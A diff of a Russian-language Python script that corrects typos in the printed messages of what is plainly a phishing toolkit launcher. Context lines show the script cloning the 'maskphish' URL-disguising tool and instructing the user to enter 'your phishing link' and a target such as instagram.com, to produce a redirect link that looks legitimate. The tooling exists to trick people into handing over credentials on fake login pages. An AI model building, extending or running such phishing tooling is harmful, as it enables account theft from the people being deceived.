@@ -93,7 +93,7 @@ while True:
 
         if tru_6 == 'n':
             os.system('clear')
-            print(Fore.RED+'[пожалуйста включите моб. Точку доступа и повторите]')
+            print(Fore.RED+'[пожалуйста включите моб. точку доступа и повторите]')
             time.sleep(3)
         else:
             os.system('clear')
@@ -124,7 +124,7 @@ while True:
                     time.sleep(4)
                     os.system('clear')
                     print(Fore.GREEN+'[ваша ссылка находится в самом нижнем ряде]')
-                    print(Fore.YELLOW+'[есле ссылка не появилась а последний символ')
+                    print(Fore.YELLOW+'[если ссылка не появилась а последний символ')
                     print(Fore.YELLOW+'знак вопроса напишите <yes>]')
                     res()
                     time.sleep(4)
@@ -132,7 +132,7 @@ while True:
                 else:
                     os.system('clear')
                     print(Fore.GREEN+'[ваша ссылка находится в самом нижнем ряде]')
-                    print(Fore.YELLOW+'[есле ссылка не появилась а последний символ')
+                    print(Fore.YELLOW+'[если ссылка не появилась а последний символ')
                     print(Fore.YELLOW+'знак вопроса напишите <yes>]')
                     res()
                     time.sleep(4)
@@ -141,7 +141,7 @@ while True:
             if tru_3 == 'n':
                 os.system('clear')
                 print(Fore.GREEN+'[Ваша ссылка находится в самом нижнем ряде]')
-                print(Fore.YELLOW+'[есле ссылка не появилась а последний символ')
+                print(Fore.YELLOW+'[если ссылка не появилась а последний символ')
                 print(Fore.YELLOW+'знак вопроса напишите <yes>]')
                 res()
                 time.sleep(4)
@@ -149,7 +149,7 @@ while True:
             else:
                 os.system('clear')
                 print(Fore.GREEN+'[ваша ссылка находится в самом нижнем ряде]')
-                print(Fore.YELLOW+'[есле ссылка не появилась а последний символ')
+                print(Fore.YELLOW+'[если ссылка не появилась а последний символ')
                 print(Fore.YELLOW+'знак вопроса напишите <yes>]')
                 res()
                 time.sleep(4)
@@ -302,9 +302,9 @@ while True:
         res()
         os.system('git clone https://github.com/jaykali/maskphish.git')
         os.chdir('maskphish')
-        print('[Инструкция:В первый ряд вводим вашу фишинг ссылку.')
+        print('[Инструкция: В первый ряд вводим вашу фишинг ссылку.')
         print('В второй ряд  вводим ссылку которую мы хотим получить,')
-        print('пример: https://Instagram.com В третьем ряде нажимаем entr.')
+        print('пример: https://instagram.com В третьем ряде нажимаем entr.')
         print('В итоге получаем редирект ссылку, которая выглядит')
         print('более менее нормально.]')
         time.sleep(10)
